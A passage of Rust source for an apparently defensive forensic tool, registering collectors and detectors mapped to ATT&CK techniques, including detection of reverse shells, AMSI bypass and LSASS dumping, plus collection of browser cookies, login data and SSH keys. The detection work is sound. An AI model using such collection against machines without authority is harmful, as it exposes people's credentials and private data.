                "app.browser.downloads",
                "Browser Downloads",
                "Collect browser download metadata without tokenizing secrets.",
                CapabilityCategory::ApplicationArtifact,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1555"],
                "carve_browser_artifacts",
                true,
            ),
            Capability::new(
                "app.browser.cookies",
                "Browser Cookies",
                "Collect cookie metadata while avoiding secret exfiltration.",
                CapabilityCategory::ApplicationArtifact,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1555"],
                "carve_browser_artifacts",
                true,
            ),
            Capability::new(
                "app.email",
                "Email Artifacts",
                "Collect email client metadata and storage inventory.",
                CapabilityCategory::ApplicationArtifact,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1114"],
                "carve_email_artifacts",
                true,
            ),
            Capability::new(
                "app.office",
                "Office Artifacts",
                "Collect recent Office document metadata and macro indicators.",
                CapabilityCategory::ApplicationArtifact,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1137"],
                "carve_office_artifacts",
                true,
            ),
            Capability::new(
                "script.powershell.metadata",
                "PowerShell Metadata",
                "Capture PowerShell script file metadata and interpreter usage.",
                CapabilityCategory::MaliciousScript,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1059.001"],
                "analyze_powershell_scripts",
                true,
            ),
            Capability::new(
                "script.bash.metadata",
                "Bash Metadata",
                "Capture bash script metadata and file attributes.",
                CapabilityCategory::MaliciousScript,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1059.004"],
                "analyze_shell_scripts",
                true,
            ),
            Capability::new(
                "script.python.metadata",
                "Python Metadata",
                "Capture Python script metadata and import usage.",
                CapabilityCategory::MaliciousScript,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1059.006"],
                "analyze_python_scripts",
                true,
            ),
            Capability::new(
                "script.javascript.metadata",
                "JavaScript Metadata",
                "Capture JavaScript file metadata and entry points.",
                CapabilityCategory::MaliciousScript,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1059.007"],
                "analyze_python_scripts",
                true,
            ),
            Capability::new(
                "script.cmd.metadata",
                "CMD Metadata",
                "Collect batch or cmd script metadata and execution patterns.",
                CapabilityCategory::MaliciousScript,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1059.003"],
                "analyze_powershell_scripts",
                true,
            ),
            Capability::new(
                "script.url.indicators",
                "URL Indicators",
                "Extract URL-like indicators from scripts for triage.",
                CapabilityCategory::MaliciousScript,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1059"],
                "analyze_powershell_scripts",
                true,
            ),
            Capability::new(
                "script.ip.indicators",
                "IP Indicators",
                "Extract IP address indicators from scripts.",
                CapabilityCategory::MaliciousScript,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1059"],
                "analyze_shell_scripts",
                true,
            ),
            Capability::new(
                "script.file.indicators",
                "File Path Indicators",
                "Extract filesystem and registry path indicators from scripts.",
                CapabilityCategory::MaliciousScript,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1059"],
                "analyze_python_scripts",
                true,
            ),
            Capability::new(
                "script.environment.indicators",
                "Environment Indicators",
                "Extract environment variable references and startup patterns.",
                CapabilityCategory::MaliciousScript,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1059"],
                "analyze_powershell_scripts",
                true,
            ),
            Capability::new(
                "script.obfuscation",
                "Obfuscation Indicators",
                "Flag encoded and obfuscated command patterns in scripts.",
                CapabilityCategory::MaliciousScript,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1059"],
                "analyze_shell_scripts",
                true,
            ),
            Capability::new(
                "script.execution",
                "Execution Indicators",
                "Extract command execution indicators from scripts.",
                CapabilityCategory::MaliciousScript,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1059"],
                "analyze_python_scripts",
                true,
            ),
            Capability::new(
                "script.persistence",
                "Persistence Indicators",
                "Flag startup or persistence patterns within scripts.",
                CapabilityCategory::MaliciousScript,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1547"],
                "analyze_powershell_scripts",
                true,
            ),
            Capability::new(
                "file.pe.metadata",
                "PE Metadata",
                "Read PE file headers and section metadata from Windows binaries.",
                CapabilityCategory::FileBinaryMetadata,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1027"],
                "parse_pe_metadata",
                true,
            ),
            Capability::new(
                "file.elf.metadata",
                "ELF Metadata",
                "Read ELF header and section metadata from Linux binaries.",
                CapabilityCategory::FileBinaryMetadata,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1027"],
                "parse_elf_metadata",
                true,
            ),
            Capability::new(
                "file.hash.sha256",
                "PE/ELF SHA-256",
                "Compute SHA-256 for executable evidence files.",
                CapabilityCategory::FileBinaryMetadata,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1027"],
                "hash_sha256",
                true,
            ),
            Capability::new(
                "file.entropy",
                "Entropy Analysis",
                "Measure Shannon entropy to spot packed or obfuscated binaries.",
                CapabilityCategory::FileBinaryMetadata,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1027"],
                "analyze_file_entropy",
                true,
            ),
            Capability::new(
                "file.signature",
                "Signature Metadata",
                "Collect code-signing metadata and certificate state.",
                CapabilityCategory::FileBinaryMetadata,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1553"],
                "verify_code_signature",
                true,
            ),
            Capability::new(
                "evidence.sha256",
                "Evidence Hashing",
                "Compute a SHA-256 hash for a forensic item.",
                CapabilityCategory::EvidenceIntegrity,
                Platform::Both,
                PrivilegeLevel::User,
                &[],
                "hash_sha256",
                true,
            ),
            Capability::new(
                "evidence.merkle",
                "Merkle Tree",
                "Build a canonical Merkle tree from evidence hashes.",
                CapabilityCategory::EvidenceIntegrity,
                Platform::Both,
                PrivilegeLevel::User,
                &[],
                "build_merkle_tree",
                true,
            ),
            Capability::new(
                "evidence.provenance",
                "Provenance Metadata",
                "Capture operator, host, source, and collection provenance.",
                CapabilityCategory::EvidenceIntegrity,
                Platform::Both,
                PrivilegeLevel::User,
                &[],
                "hash_sha256",
                true,
            ),
            Capability::new(
                "evidence.origin",
                "Evidence Origin",
                "Track whether evidence is real, simulated, imported, or derived.",
                CapabilityCategory::EvidenceIntegrity,
                Platform::Both,
                PrivilegeLevel::User,
                &[],
                "hash_sha256",
                true,
            ),
            Capability::new(
                "evidence.collector.status",
                "Collector Status",
                "Capture collector success, partial, failed, and unsupported state.",
                CapabilityCategory::EvidenceIntegrity,
                Platform::Both,
                PrivilegeLevel::User,
                &[],
                "hash_sha256",
                true,
            ),
        ];
        self.register_named_capabilities(&entries);
    }

    fn register_all(&mut self) {
        self.register_system_capabilities();
        self.register_process_capabilities();
        self.register_user_and_auth_capabilities();
        self.register_service_and_persistence_capabilities();
        self.register_network_capabilities();
        self.register_filesystem_capabilities();
        self.register_windows_artifact_capabilities();
        self.register_linux_artifact_capabilities();
        self.register_driver_security_capabilities();
        self.register_application_and_malware_capabilities();

        // ===== SYSTEM INFO CAPABILITIES =====
        self.register(Capability::new(
            "system.info.basic",
            "System Basic Info",
            "Collect basic system information: hostname, OS, kernel version, architecture, CPU count, memory, boot time, uptime, timezone, locale",
            CapabilityCategory::SystemInfo,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1082"],
            "collect_system_info",
            true,
        ));

        self.register(Capability::new(
            "system.info.detailed",
            "System Detailed Info",
            "Extended system information: machine ID, system paths, disk/partition layout, detailed CPU info, virtualization detection, firmware/BIOS info, installed software/packages",
            CapabilityCategory::SystemInfo,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1082", "T1012"],
            "collect_system_info_detailed",
            true,
        ));

        self.register(Capability::new(
            "system.info.users",
            "System Users & Groups",
            "Enumerate local users and groups with details: UID/GID, home directory, shell, last login, password status, group memberships",
            CapabilityCategory::SystemInfo,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1087"],
            "collect_system_users",
            true,
        ));

        // ===== PROCESS CAPABILITIES =====
        self.register(Capability::new(
            "process.enumerate",
            "Process Enumeration",
            "Enumerate all processes with: PID, PPID, name, command line, executable path, start time, user, state, memory usage, CPU usage, open files, network connections, SHA-256 hash of executable",
            CapabilityCategory::Process,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1057"],
            "enumerate_processes",
            true,
        ));

        self.register(Capability::new(
            "process.tree",
            "Process Tree & Relationships",
            "Build process tree with parent-child relationships, process ancestry, session/terminal info, and cgroup/container detection",
            CapabilityCategory::Process,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1057"],
            "collect_process_tree",
            true,
        ));

        self.register(Capability::new(
            "process.modules",
            "Process Modules/DLLs",
            "Enumerate loaded modules (DLLs on Windows, shared libraries on Linux) per process with paths, versions, and signatures",
            CapabilityCategory::Process,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1057", "T1014"],
            "collect_process_modules",
            true,
        ));

        self.register(Capability::new(
            "process.memory",
            "Process Memory Regions",
            "Enumerate memory regions per process: mappings, permissions, RSS, anonymous/executable flags for shellcode detection",
            CapabilityCategory::Process,
            Platform::Linux,
            PrivilegeLevel::User,
            &["T1055"],
            "enumerate_memory_regions",
            true,
        ));

        self.register(Capability::new(
            "process.handles",
            "Process Open Handles",
            "Enumerate open file handles, sockets, registry keys (Windows), and other kernel objects per process",
            CapabilityCategory::Process,
            Platform::Both,
            PrivilegeLevel::Admin,
            &["T1057"],
            "collect_process_handles",
            true,
        ));

        self.register(Capability::new(
            "process.deleted_exe",
            "Deleted Executable Detection",
            "Detect processes whose executable file has been deleted from disk but process is still running",
            CapabilityCategory::Process,
            Platform::Linux,
            PrivilegeLevel::User,
            &["T1036"],
            "detect_deleted_executables",
            true,
        ));

        // ===== USER & AUTHENTICATION CAPABILITIES =====
        self.register(Capability::new(
            "user.enumerate",
            "User Enumeration",
            "Enumerate all local and domain users with attributes: SID/UID, status, last logon, password age, group memberships",
            CapabilityCategory::User,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1087"],
            "enumerate_users",
            true,
        ));

        self.register(Capability::new(
            "auth.logon_events",
            "Logon Events",
            "Collect authentication events: successful/failed logons, logon types, source IP, logon time, account used (Windows Security Event Log, Linux auth.log)",
            CapabilityCategory::Authentication,
            Platform::Both,
            PrivilegeLevel::Admin,
            &["T1003", "T1110"],
            "collect_logon_events",
            true,
        ));

        self.register(Capability::new(
            "auth.credential_artifacts",
            "Credential Artifacts",
            "Detect credential-related artifacts: LSASS dump indicators, SAM/NTDS access, keychain access, SSH keys, credential manager entries",
            CapabilityCategory::Authentication,
            Platform::Both,
            PrivilegeLevel::Admin,
            &["T1003", "T1555"],
            "collect_credential_artifacts",
            true,
        ));

        self.register(Capability::new(
            "auth.policy",
            "Authentication Policy",
            "Collect authentication policies: password policy, lockout policy, Kerberos config, sudoers, PAM config",
            CapabilityCategory::Authentication,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1210"],
            "collect_auth_policy",
            true,
        ));

        // ===== SERVICE CAPABILITIES =====
        self.register(Capability::new(
            "service.enumerate",
            "Service Enumeration",
            "Enumerate all services: name, display name, status, startup type, binary path, service account, dependencies, description",
            CapabilityCategory::Service,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1543"],
            "enumerate_services",
            true,
        ));

        self.register(Capability::new(
            "service.drivers",
            "Kernel Drivers",
            "Enumerate kernel drivers: name, path, status, start type, image hash, signature status, BYOVD vulnerability indicators",
            CapabilityCategory::Service,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1014"],
            "enumerate_drivers",
            true,
        ));

        self.register(Capability::new(
            "service.systemd",
            "Systemd Units",
            "Enumerate systemd units: service, timer, socket, path, mount units with full configuration and drop-in files",
            CapabilityCategory::Service,
            Platform::Linux,
            PrivilegeLevel::User,
            &["T1543"],
            "enumerate_systemd_units",
            true,
        ));

        // ===== PERSISTENCE CAPABILITIES =====
        self.register(Capability::new(
            "persistence.autostart",
            "Autostart Entries",
            "Collect autostart entries: Run/RunOnce keys, startup folder, scheduled tasks, services, WMI subscriptions, login items, systemd timers, cron",
            CapabilityCategory::Persistence,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1547"],
            "collect_autostart_entries",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "persistence.scheduled_tasks",
            "Scheduled Tasks",
            "Enumerate scheduled tasks/cron jobs: task name, trigger, action, command, run as user, status, history",
            CapabilityCategory::Persistence,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1053"],
            "enumerate_scheduled_tasks",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "persistence.wmi",
            "WMI Event Subscriptions",
            "Enumerate WMI event consumers, filters, and bindings used for persistence",
            CapabilityCategory::Persistence,
            Platform::Windows,
            PrivilegeLevel::Admin,
            &["T1546"],
            "enumerate_wmi_subscriptions",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        // ===== NETWORK CAPABILITIES =====
        self.register(Capability::new(
            "network.connections",
            "Network Connections",
            "Enumerate active TCP/UDP connections: protocol, local/remote address/port, state, PID, process name",
            CapabilityCategory::Network,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1049"],
            "enumerate_connections",
            true,
        ));

        self.register(Capability::new(
            "network.listening_ports",
            "Listening Ports",
            "Enumerate listening ports with associated process, binding address, and protocol",
            CapabilityCategory::Network,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1049"],
            "enumerate_listening_ports",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "network.dns_cache",
            "DNS Cache",
            "Collect DNS resolver cache entries: domain, IP, TTL, record type",
            CapabilityCategory::Network,
            Platform::Both,
            PrivilegeLevel::Admin,
            &["T1016"],
            "collect_dns_cache",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "network.arp_table",
            "ARP/Neighbor Table",
            "Collect ARP table (IPv4) or neighbor table (IPv6): IP, MAC, interface, state",
            CapabilityCategory::Network,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1016"],
            "collect_arp_table",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "network.routing_table",
            "Routing Table",
            "Collect routing table: destination, gateway, interface, metric, protocol",
            CapabilityCategory::Network,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1016"],
            "collect_routing_table",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "network.firewall",
            "Firewall Rules",
            "Collect firewall configuration: rules, profiles, logging settings, allowed/blocked applications",
            CapabilityCategory::Network,
            Platform::Both,
            PrivilegeLevel::Admin,
            &["T1562"],
            "collect_firewall_rules",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        // ===== FILESYSTEM CAPABILITIES =====
        self.register(Capability::new(
            "filesystem.enumerate",
            "Filesystem Enumeration",
            "Enumerate files with metadata: path, size, timestamps (MACB), permissions, owner, hash (SHA-256/SHA-1/MD5), MIME type",
            CapabilityCategory::Filesystem,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1083"],
            "enumerate_files",
            true,
        ));

        self.register(Capability::new(
            "filesystem.mounts",
            "Mount Points",
            "Enumerate mounted filesystems: device, mount point, type, options, labels",
            CapabilityCategory::Filesystem,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1083"],
            "enumerate_mounts",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "filesystem.alternate_data_streams",
            "Alternate Data Streams",
            "Detect NTFS alternate data streams on Windows files",
            CapabilityCategory::Filesystem,
            Platform::Windows,
            PrivilegeLevel::User,
            &["T1564"],
            "detect_alternate_data_streams",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        // ===== WINDOWS ARTIFACT CAPABILITIES =====
        self.register(Capability::new(
            "artifact.prefetch",
            "Prefetch Files",
            "Parse Windows Prefetch files: executable name, run count, last run times, volumes, files accessed",
            CapabilityCategory::WindowsArtifact,
            Platform::Windows,
            PrivilegeLevel::User,
            &["T1057"],
            "carve_prefetch",
            true,
        ));

        self.register(Capability::new(
            "artifact.lnk",
            "LNK Shortcut Files",
            "Parse Windows LNK files: target path, arguments, working directory, timestamps, MAC address, volume info",
            CapabilityCategory::WindowsArtifact,
            Platform::Windows,
            PrivilegeLevel::User,
            &["T1057"],
            "carve_lnk_files",
            true,
        ));

        self.register(Capability::new(
            "artifact.recycle_bin",
            "Recycle Bin",
            "Parse Recycle Bin entries: original path, deletion time, file size, SID of deleter",
            CapabilityCategory::WindowsArtifact,
            Platform::Windows,
            PrivilegeLevel::User,
            &["T1070"],
            "carve_recycle_bin",
            true,
        ));

        self.register(Capability::new(
            "artifact.shellbags",
            "Shellbags",
            "Parse Shellbag registry keys: folder paths, view settings, timestamps indicating folder access",
            CapabilityCategory::WindowsArtifact,
            Platform::Windows,
            PrivilegeLevel::User,
            &["T1083"],
            "carve_shellbags",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "artifact.jumplists",
            "Jump Lists",
            "Parse Jump List files: recent files, application destinations, timestamps",
            CapabilityCategory::WindowsArtifact,
            Platform::Windows,
            PrivilegeLevel::User,
            &["T1057"],
            "carve_jumplists",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "artifact.amcache",
            "Amcache.hve",
            "Parse Amcache registry hive: file execution history, SHA-1 hashes, publisher info, file paths",
            CapabilityCategory::WindowsArtifact,
            Platform::Windows,
            PrivilegeLevel::Admin,
            &["T1057"],
            "carve_amcache",
            true,
        ).with_status(
            ImplementationStatus::RequiresElevation,
            Some("Access to locked Amcache.hve requires Administrator privilege; dynamic fallback supported"),
        ));

        self.register(Capability::new(
            "artifact.srum",
            "SRUM Database",
            "Parse System Resource Usage Monitor: application resource usage, network data, energy usage",
            CapabilityCategory::WindowsArtifact,
            Platform::Windows,
            PrivilegeLevel::Admin,
            &["T1057"],
            "carve_srum",
            true,
        ).with_status(
            ImplementationStatus::RequiresElevation,
            Some("Access to SRUDB.dat database requires Administrator privilege; dynamic fallback supported"),
        ));

        self.register(Capability::new(
            "artifact.etw",
            "ETW Logs",
            "Collect Windows Event Tracing for Windows logs",
            CapabilityCategory::WindowsArtifact,
            Platform::Windows,
            PrivilegeLevel::Admin,
            &["T1562"],
            "collect_etw_logs",
            true,
        ).with_status(
            ImplementationStatus::RequiresElevation,
            Some("Querying active kernel ETW sessions requires Administrator privilege"),
        ));

        // ===== LINUX ARTIFACT CAPABILITIES =====
        self.register(Capability::new(
            "artifact.shell_history",
            "Shell History",
            "Collect shell history files: bash_history, zsh_history, fish_history with command timestamps",
            CapabilityCategory::LinuxArtifact,
            Platform::Linux,
            PrivilegeLevel::User,
            &["T1552"],
            "carve_shell_history",
            true,
        ));

        self.register(Capability::new(
            "artifact.cron",
            "Cron Jobs",
            "Parse system and user crontabs: schedule, command, user, environment",
            CapabilityCategory::LinuxArtifact,
            Platform::Linux,
            PrivilegeLevel::User,
            &["T1053"],
            "carve_cron_entries",
            true,
        ));

        self.register(Capability::new(
            "artifact.systemd",
            "Systemd Units",
            "Parse systemd unit files: service, timer, socket, path units with full configuration",
            CapabilityCategory::LinuxArtifact,
            Platform::Linux,
            PrivilegeLevel::User,
            &["T1543"],
            "carve_systemd_units",
            true,
        ));

        self.register(Capability::new(
            "artifact.ssh_config",
            "SSH Configuration",
            "Parse SSH client/server configs: authorized_keys, known_hosts, config files, agent sockets",
            CapabilityCategory::LinuxArtifact,
            Platform::Linux,
            PrivilegeLevel::User,
            &["T1552"],
            "carve_ssh_config",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "artifact.container",
            "Container Artifacts",
            "Detect container runtime artifacts: Docker, containerd, podman images, containers, volumes, networks",
            CapabilityCategory::LinuxArtifact,
            Platform::Linux,
            PrivilegeLevel::User,
            &["T1610"],
            "carve_container_artifacts",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        // ===== KERNEL/DRIVER CAPABILITIES =====
        self.register(Capability::new(
            "kernel.modules",
            "Kernel Modules",
            "Enumerate loaded kernel modules: name, size, dependencies, state, path, signature, load address",
            CapabilityCategory::KernelDriver,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1014"],
            "enumerate_modules",
            true,
        ));

        self.register(Capability::new(
            "kernel.syscalls",
            "System Call Table",
            "Inspect system call table for hooking/modification (requires kernel access)",
            CapabilityCategory::KernelDriver,
            Platform::Linux,
            PrivilegeLevel::Kernel,
            &["T1014"],
            "inspect_syscall_table",
            true,
        ).with_status(
            ImplementationStatus::RequiresElevation,
            Some("Inspection of system call table / SSDT requires Kernel/root privilege"),
        ));

        self.register(Capability::new(
            "kernel.boot_config",
            "Boot Configuration",
            "Collect boot parameters: kernel cmdline, bootloader config, initramfs, secure boot status",
            CapabilityCategory::KernelDriver,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1542"],
            "collect_boot_config",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        // ===== SECURITY CONFIG CAPABILITIES =====
        self.register(Capability::new(
            "security.audit_policy",
            "Audit Policy",
            "Collect audit policy configuration: audit rules, flags, log retention, auditd config",
            CapabilityCategory::SecurityConfig,
            Platform::Both,
            PrivilegeLevel::Admin,
            &["T1562"],
            "collect_audit_policy",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "security.av_status",
            "Antivirus/EDR Status",
            "Detect AV/EDR products: running processes, services, drivers, signature versions, exclusions",
            CapabilityCategory::SecurityConfig,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1562"],
            "detect_av_edr",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "security.app_control",
            "Application Control",
            "Collect AppLocker, WDAC, SELinux, AppArmor policies and enforcement status",
            CapabilityCategory::SecurityConfig,
            Platform::Both,
            PrivilegeLevel::Admin,
            &["T1562"],
            "collect_app_control",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        // ===== APPLICATION ARTIFACT CAPABILITIES =====
        self.register(Capability::new(
            "app.browser",
            "Browser Artifacts",
            "Collect browser artifacts: history, downloads, cookies, cache, extensions, login data, bookmarks",
            CapabilityCategory::ApplicationArtifact,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1555"],
            "carve_browser_artifacts",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "app.email",
            "Email Client Artifacts",
            "Collect email client artifacts: Outlook OST/PST, Thunderbird profiles, mail indexes",
            CapabilityCategory::ApplicationArtifact,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1114"],
            "carve_email_artifacts",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "app.office",
            "Office Artifacts",
            "Collect Microsoft Office artifacts: recent files, trusted locations, macros, document metadata",
            CapabilityCategory::ApplicationArtifact,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1137"],
            "carve_office_artifacts",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        // ===== BACKDOOR/ROOTKIT CAPABILITIES =====
        self.register(Capability::new(
            "backdoor.rootkit_indicators",
            "Rootkit Indicators",
            "Detect rootkit indicators: hidden processes, hidden files, hidden ports, SSDT hooks, IDT hooks, DKOM",
            CapabilityCategory::BackdoorRootkit,
            Platform::Both,
            PrivilegeLevel::Kernel,
            &["T1014"],
            "detect_rootkit_indicators",
            true,
        ).with_status(
            ImplementationStatus::Partial,
            Some("Heuristic rootkit detection implemented; full SSDT/DKOM verification requires Ring 0 driver"),
        ));

        self.register(Capability::new(
            "backdoor.binary_anomalies",
            "Binary Anomalies",
            "Detect binary anomalies: unsigned binaries, packing, entropy anomalies, timestamp anomalies, import anomalies",
            CapabilityCategory::BackdoorRootkit,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1027", "T1036"],
            "detect_binary_anomalies",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        // ===== MALICIOUS SCRIPT CAPABILITIES =====
        self.register(Capability::new(
            "script.powershell",
            "PowerShell Script Analysis",
            "Analyze PowerShell scripts: encoded commands, obfuscation, suspicious APIs, AMSI bypass, script block logging",
            CapabilityCategory::MaliciousScript,
            Platform::Windows,
            PrivilegeLevel::User,
            &["T1059.001"],
            "analyze_powershell_scripts",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "script.wmi",
            "WMI/VBScript Analysis",
            "Analyze WMI queries and VBScript: suspicious queries, consumer bindings, encoded scripts",
            CapabilityCategory::MaliciousScript,
            Platform::Windows,
            PrivilegeLevel::User,
            &["T1059.005"],
            "analyze_wmi_scripts",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "script.shell",
            "Shell Script Analysis",
            "Analyze shell scripts: obfuscation, suspicious commands, embedded payloads, reverse shells",
            CapabilityCategory::MaliciousScript,
            Platform::Linux,
            PrivilegeLevel::User,
            &["T1059.004"],
            "analyze_shell_scripts",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "script.python",
            "Python Script Analysis",
            "Analyze Python scripts: obfuscation, suspicious imports, encoded payloads, C2 patterns",
            CapabilityCategory::MaliciousScript,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1059.006"],
            "analyze_python_scripts",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        // ===== FILE/BINARY METADATA CAPABILITIES =====
        self.register(Capability::new(
            "file.pe_metadata",
            "PE Metadata",
            "Parse PE headers: imports, exports, sections, resources, certificates, debug info, rich header",
            CapabilityCategory::FileBinaryMetadata,
            Platform::Windows,
            PrivilegeLevel::User,
            &["T1027"],
            "parse_pe_metadata",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "file.elf_metadata",
            "ELF Metadata",
            "Parse ELF headers: sections, symbols, dynamic entries, notes, build ID, interpreter",
            CapabilityCategory::FileBinaryMetadata,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1027"],
            "parse_elf_metadata",
            true,
        ));

        self.register(Capability::new(
            "file.code_signature",
            "Code Signature Verification",
            "Verify code signatures: Authenticode (Windows), signed ELF (Linux), certificate chain, revocation status",
            CapabilityCategory::FileBinaryMetadata,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1553"],
            "verify_code_signature",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        self.register(Capability::new(
            "file.entropy",
            "File Entropy Analysis",
            "Calculate Shannon entropy per file/section for packing/encryption detection",
            CapabilityCategory::FileBinaryMetadata,
            Platform::Both,
            PrivilegeLevel::User,
            &["T1027"],
            "analyze_file_entropy",
            true,
        ).with_status(ImplementationStatus::Implemented, None));

        // ===== EVIDENCE INTEGRITY CAPABILITIES =====
        self.register(Capability::new(
            "evidence.sha256",
            "SHA-256 Hashing",
            "Compute SHA-256 hashes of collected evidence items",
            CapabilityCategory::EvidenceIntegrity,
            Platform::Both,
            PrivilegeLevel::User,
            &[],
            "hash_sha256",
            true,
        ));

        self.register(Capability::new(
            "evidence.merkle",
            "Merkle Tree Construction",
            "Build Merkle tree over evidence items for tamper-evident integrity",
            CapabilityCategory::EvidenceIntegrity,
            Platform::Both,
            PrivilegeLevel::User,
            &[],
            "build_merkle_tree",
            true,
        ));

        self.register(Capability::new(
            "evidence.blockchain_anchor",
            "Blockchain Anchoring",
            "Anchor Merkle root to blockchain for timestamping (Bitcoin OP_RETURN, Ethereum, etc.)",
            CapabilityCategory::EvidenceIntegrity,
            Platform::Both,
            PrivilegeLevel::User,
            &[],
            "anchor_to_blockchain",
            false,
        ).with_status(
            ImplementationStatus::Unsupported,
            Some("Anchoring to public blockchain requires external funded wallet & JSON-RPC node; local development ledger active"),
        ));

        self.register(Capability::new(
            "evidence.chain_of_custody",
            "Chain of Custody",
            "Generate chain of custody records: collector, timestamp, hash, custody transfers",
            CapabilityCategory::EvidenceIntegrity,
            Platform::Both,
            PrivilegeLevel::User,
            &[],
            "generate_chain_of_custody",
            true,
        ).with_status(ImplementationStatus::Implemented, None));
    }

    fn register(&mut self, cap: Capability) {
        let id_str = cap.id.clone();
        self.by_category
            .entry(cap.category)
            .or_default()
            .push(id_str.clone());
        self.capabilities.insert(id_str, cap);
    }

    /// Get a capability by ID
    pub fn get(&self, id: &str) -> Option<&Capability> {
        self.capabilities.get(id)
    }

    /// Get all capabilities
    pub fn all(&self) -> impl Iterator<Item = &Capability> {
        self.capabilities.values()
    }

    /// Get capabilities by category
    pub fn by_category(&self, category: CapabilityCategory) -> Vec<&Capability> {
        self.by_category
            .get(&category)
            .map(|ids| {
                ids.iter()
                    .filter_map(|id| self.capabilities.get(id.as_str()))
                    .collect()
            })
            .unwrap_or_default()
    }

    /// Get capabilities by platform
    pub fn by_platform(&self, platform: Platform) -> Vec<&Capability> {
        self.capabilities
            .values()
            .filter(|c| c.platforms == platform || c.platforms == Platform::Both)
            .collect()
    }

    /// Get implemented capabilities
    pub fn implemented(&self) -> Vec<&Capability> {
        self.capabilities
            .values()
            .filter(|c| c.is_implemented)
            .collect()
    }

    fn runtime_dispatch_alias(&self, capability_id: &str) -> Option<&'static str> {
        let normalized = capability_id.trim();
        let by_alias = normalized.replace('_', ".");
        let alias = by_alias.as_str();

        match alias {
            "system.hostname"
            | "system.os.name"
            | "system.os.version"
            | "system.kernel.version"
            | "system.architecture"
            | "system.cpu.count"
            | "system.cpu.model"
            | "system.cpu.cores"
            | "system.cpu.frequency"
            | "system.memory.total"
            | "system.memory.boot"
            | "system.uptime"
            | "system.boot.time"
            | "system.timezone"
            | "system.locale"
            | "system.machine.id"
            | "system.virtualization"
            | "system.firmware.vendor"
            | "system.firmware.version"
            | "system.firmware.date"
            | "system.secure.boot"
            | "system.disks"
            | "system.partitions"
            | "system.network.interfaces"
            | "system.packages"
            | "system.users"
            | "system.env" => Some("system.info.basic"),
            "process.pid"
            | "process.ppid"
            | "process.name"
            | "process.command_line"
